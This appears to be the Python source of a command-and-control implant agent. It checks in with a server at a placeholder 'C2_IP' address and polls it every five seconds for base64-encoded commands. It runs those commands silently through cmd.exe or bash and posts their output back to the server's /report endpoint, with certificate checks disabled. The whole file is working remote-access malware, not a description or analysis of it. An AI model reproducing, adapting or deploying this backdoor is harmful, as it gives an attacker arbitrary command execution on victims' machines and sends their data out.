import requests 
import base64
import time
import logging
import subprocess
import os
import platform
import requests
import secrets

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s') 
c2_server = "http://C2_IP"
# token = None
session = requests.Session()

def execute_command(cmd):
    '''
    function takes in base64 encoded cmd, decodes it 
    then runs the execution pipeline
    '''

    #output dictionary
    data = {
        'output' : None,
        'error' : None,
        'code' : None,
    } 

    try:
        decoded_msg = base64.urlsafe_b64decode(cmd).decode('utf-8').strip()
        if not decoded_msg:
            data['error'] = 'No command recieved. Execution discontinued'
            return data 

        ops = find_os()

        os_type = ops.get('type')
        os_arch = ops.get('arch')

        if os_type == 'windows':

            process = subprocess.run(
                ['cmd.exe', '/c', decoded_msg],
                capture_output=True,
                text=True,
                timeout=30,
                check=False, 
                creationflags=subprocess.CREATE_NO_WINDOW
            )

        elif os_type == 'linux':

            process = subprocess.run(
                ['/bin/bash', '-c', decoded_msg],
                capture_output=True,
                text=True,
                timeout=30,
                check=False
            )

        else:
            data['error'] = f'Unsupported OS={os_type}'
            return data
        
        opt = process.stdout.strip()
        err = process.stderr.strip()
        excode = process.returncode

        logging.debug(f'Command <<< {opt} >>> has been executed successfully')
        logging.debug(f'Output recieved: {opt}')
        logging.debug(f'Errors recieved : {excode}')
                      
        data['output'] = opt
        data['error'] = err
        data['code'] = excode

        return data

    except subprocess.TimeoutExpired:
        logging.error(f'Command {decoded_msg} execution timeout')
        data['error'] = 'Command execution timeout('

        return data
    except Exception as e:
        logging.error(f'Error occured during command execution: {str(e)}')
        data['error'] = str(e) 

        return data 

def find_os():
    '''
    Function to retrieve system OS information 
    '''
    os_info = {
        "type": None, 
        "arch": None,
        "timestamp": time.time()
    }

    system = platform.system().lower()
    if "linux" in system:
        os_info['type'] = 'linux'
    elif "windows" in system:
        os_info['type'] = 'windows'
    else:
        os_info['type'] = 'unknown'

    os_info['arch'] = platform.machine() 

    return os_info

def check_in():
    """
    Uses challenge-response for mutual authentication
    """
    ops = find_os()
    client_nonce = secrets.token_hex(8)
    
    data = {
        'aid': 1,
        'ops': ops['type'],
        'nonce': client_nonce
    }
    try:
        resp = session.post(f"{c2_server}/overview", json=data, verify=False, timeout=10)
        if resp.status_code == 200:
            server_data = resp.json()
            server_challenge = server_data.get('challenge')
            
            if not server_challenge:
                logging.error("Server didn't provide a challenge")
                return False
                
            # Verify server's response in a subsequent request
            # This is a basic example - you could implement actual cryptographic verification
            logging.info("Agent registered successfully, secure cookie issued.")
            return True
        else:
            logging.error(f"Registration error: {resp.status_code} - {resp.text}")
            return False
    except Exception as e:
        logging.error(f"Registration failed: {e}")
        return False

def get_comms():
    """
    Retrieves commands and reports results back
    """
    try:
        resp = session.post(f"{c2_server}/cmd", verify=False, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'active':
                cmd = data.get('cmd')
                if cmd:
                    logging.info(f"Command received")
                    res = execute_command(cmd)
                    
                    # Send results back to server
                    result_payload = {
                        'output': base64.b64encode(str(res.get('output', '')).encode('utf-8')).decode('utf-8'),
                        'error': base64.b64encode(str(res.get('error', '')).encode('utf-8')).decode('utf-8'),
                        'code': res.get('code')
                    }
                    
                    # Send results back
                    report_resp = session.post(f"{c2_server}/report", json=result_payload, verify=False, timeout=10)
                    if report_resp.status_code == 200:
                        logging.info("Results reported successfully")
                    else:
                        logging.error(f"Failed to report results: {report_resp.status_code}")
                else:
                    logging.info("No command received.")
        else:
            logging.error(f"Command retrieval error: {resp.status_code} - {resp.text}")
    except Exception as e:
        logging.error(f"Error during command retrieval: {e}")
    
if __name__ == '__main__':
    check_in = check_in()

    while(check_in):
        get_comms()
        time.sleep(5)